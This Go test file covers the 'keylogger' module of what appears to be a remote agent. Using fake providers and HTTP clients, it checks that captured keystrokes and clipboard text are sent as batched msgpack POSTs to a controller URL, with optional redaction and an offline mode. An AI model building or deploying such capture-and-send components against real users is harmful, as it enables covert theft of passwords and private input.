package keylogger

import (
	"bytes"
	"context"
	"encoding/json"
	"io"
	"net/http"
	"sync"
	"testing"
	"time"

	"github.com/vmihailenco/msgpack/v5"
)

type fakeStream struct {
	events chan CaptureEvent
	once   sync.Once
}

func (s *fakeStream) Events() <-chan CaptureEvent {
	return s.events
}

func (s *fakeStream) Close() error {
	s.once.Do(func() {
		close(s.events)
	})
	return nil
}

type fakeProvider struct {
	stream *fakeStream
}

func (p *fakeProvider) Start(ctx context.Context, cfg StartConfig) (EventStream, error) {
	go func() {
		<-ctx.Done()
		p.stream.Close()
	}()
	return p.stream, nil
}

type recordedRequest struct {
	Method string
	URL    string
	Body   []byte
}

type fakeHTTPClient struct {
	mu       sync.Mutex
	requests []recordedRequest
}

func (c *fakeHTTPClient) Do(req *http.Request) (*http.Response, error) {
	body := make([]byte, 0)
	if req.Body != nil {
		defer req.Body.Close()
		data, _ := io.ReadAll(req.Body)
		body = data
	}
	c.mu.Lock()
	c.requests = append(c.requests, recordedRequest{Method: req.Method, URL: req.URL.String(), Body: body})
	c.mu.Unlock()

	return &http.Response{
		StatusCode: http.StatusOK,
		Body:       io.NopCloser(bytes.NewReader(nil)),
		Header:     make(http.Header),
	}, nil
}

func (c *fakeHTTPClient) popRequest(t *testing.T) recordedRequest {
	t.Helper()
	deadline := time.After(2 * time.Second)
	for {
		c.mu.Lock()
		if len(c.requests) > 0 {
			req := c.requests[0]
			c.requests = c.requests[1:]
			c.mu.Unlock()
			return req
		}
		c.mu.Unlock()
		select {
		case <-time.After(10 * time.Millisecond):
		case <-deadline:
			t.Fatalf("timed out waiting for request")
		}
	}
}

func TestManagerStreamsEvents(t *testing.T) {
	provider := &fakeProvider{stream: &fakeStream{events: make(chan CaptureEvent, 4)}}
	client := &fakeHTTPClient{}

	manager := NewManager(Config{AgentID: "agent-1", BaseURL: "https://controller", Client: client})
	manager.SetProviderFactory(func() Provider {
		return provider
	})

	payload := CommandPayload{
		Action: "start",
		Config: &StartConfig{Mode: ModeStandard, CadenceMs: 50, BufferSize: 2, RedactSecrets: true, IncludeClipboard: true},
	}
	data, _ := json.Marshal(payload)
	result := manager.HandleCommand(context.Background(), Command{ID: "cmd-1", Name: "keylogger.start", Payload: data})
	if !result.Success {
		t.Fatalf("expected start success, got error: %s", result.Error)
	}

	provider.stream.events <- CaptureEvent{Key: "a", Text: "password=secret", Timestamp: time.Now()}
	provider.stream.events <- CaptureEvent{Key: "b", ClipboardText: "1234567890123456", Timestamp: time.Now()}

	req := client.popRequest(t)
	if req.Method != http.MethodPost {
		t.Fatalf("expected POST, got %s", req.Method)
	}

	var envelope EventEnvelope
	if err := msgpack.Unmarshal(req.Body, &envelope); err != nil {
		t.Fatalf("failed to parse envelope: %v", err)
	}

	if len(envelope.Events) != 2 {
		t.Fatalf("expected 2 events, got %d", len(envelope.Events))
	}
	if envelope.Events[0].Text != "[redacted]" {
		t.Fatalf("expected secrets to be redacted, got %q", envelope.Events[0].Text)
	}
	if envelope.Events[1].Clipboard != "[redacted]" {
		t.Fatalf("expected clipboard redaction, got %q", envelope.Events[1].Clipboard)
	}

	stopPayload := CommandPayload{Action: "stop", SessionID: envelope.SessionID}
	stopData, _ := json.Marshal(stopPayload)
	stopResult := manager.HandleCommand(context.Background(), Command{ID: "cmd-2", Name: "keylogger.stop", Payload: stopData})
	if !stopResult.Success {
		t.Fatalf("expected stop success, got %s", stopResult.Error)
	}
}

func TestManagerOfflineFlush(t *testing.T) {
	provider := &fakeProvider{stream: &fakeStream{events: make(chan CaptureEvent, 1)}}
	client := &fakeHTTPClient{}

	manager := NewManager(Config{AgentID: "agent-1", BaseURL: "https://controller", Client: client})
	manager.SetProviderFactory(func() Provider { return provider })

	payload := CommandPayload{
		Action: "start",
		Config: &StartConfig{Mode: ModeOffline, BatchIntervalMs: 50, BufferSize: 10},
	}
	data, _ := json.Marshal(payload)
	result := manager.HandleCommand(context.Background(), Command{ID: "cmd-1", Name: "keylogger.start", Payload: data})
	if !result.Success {
		t.Fatalf("expected start success: %s", result.Error)
	}

	provider.stream.events <- CaptureEvent{Key: "c", Timestamp: time.Now()}

	req := client.popRequest(t)
	var envelope EventEnvelope
	if err := msgpack.Unmarshal(req.Body, &envelope); err != nil {
		t.Fatalf("failed to parse envelope: %v", err)
	}
	if envelope.Mode != ModeOffline {
		t.Fatalf("expected offline mode, got %s", envelope.Mode)
	}
}
